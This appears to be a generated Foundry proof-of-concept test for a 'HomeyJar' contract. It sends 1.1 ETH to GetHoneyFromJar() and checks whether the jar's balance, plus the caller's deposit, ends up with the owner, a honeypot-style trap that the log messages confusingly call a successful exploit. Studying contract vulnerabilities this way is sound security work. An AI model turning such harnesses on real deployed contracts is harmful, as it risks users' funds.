// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol";

contract HomeyJarTest is Test {
    HomeyJar public jar;
    address deployer;
    address attacker;
    
    // Constants for wei values
    uint256 constant FIVE_ETH = 5e18;
    uint256 constant ATTACKER_AMOUNT = 1.1e18; // 1.1 ETH in wei

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        
        // Deploy contract with deployer as owner
        vm.prank(deployer);
        jar = new HomeyJar();
        
        // Fund contract with 5 ETH
        vm.deal(address(jar), FIVE_ETH);
    }

    function test_GetHoneyFromJarVulnerability() public {
        // Fund attacker with exact amount needed (1.1 ETH)
        vm.deal(attacker, ATTACKER_AMOUNT);
        
        console.log("--- BEFORE-Trigger ---");
        uint256 jarBalanceBefore = address(jar).balance;
        uint256 deployerBalanceBefore = deployer.balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract balance before: %s", jarBalanceBefore);
        console.log("Owner balance before: %s", deployerBalanceBefore);
        console.log("Attacker balance before: %s", attackerBalanceBefore);

        console.log("--- Trigger Attack ---");
        bool success;
        bytes memory payload = abi.encodeWithSignature("GetHoneyFromJar()");
        vm.startPrank(attacker);
        (success, ) = address(jar).call{value: ATTACKER_AMOUNT}(payload);
        vm.stopPrank();

        console.log("--- AFTER-Trigger ---");
        uint256 jarBalanceAfter = address(jar).balance;
        uint256 deployerBalanceAfter = deployer.balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract balance after: %s", jarBalanceAfter);
        console.log("Owner balance after: %s", deployerBalanceAfter);
        console.log("Attacker balance after: %s", attackerBalanceAfter);

        if (!success) {
            console.log("Vulnerability not Exist: Attack transaction reverted");
        } else {
            bool drained = (jarBalanceAfter == 0);
            bool ownerGained = (deployerBalanceAfter == deployerBalanceBefore + jarBalanceBefore + ATTACKER_AMOUNT);
            bool attackerLost = (attackerBalanceAfter == attackerBalanceBefore - ATTACKER_AMOUNT);
            bool exploited = drained && ownerGained && attackerLost;
            
            if (exploited) {
                console.log("Vulnerability Exists: Exploitation successful - contract drained");
            } else {
                console.log("Vulnerability not Exist: Balances not changed as expected");
            }
        }

        // Final conditional verdict
        if (success && 
            (jarBalanceAfter == 0) && 
            (deployerBalanceAfter == deployerBalanceBefore + jarBalanceBefore + ATTACKER_AMOUNT) && 
            (attackerBalanceAfter == attackerBalanceBefore - ATTACKER_AMOUNT)
        ) {
            console.log("Vulnerability Exists: Funds transferred to owner as expected");
        } else {
            console.log("Vulnerability not Exist: Attack failed or funds not transferred properly");
        }
    }
}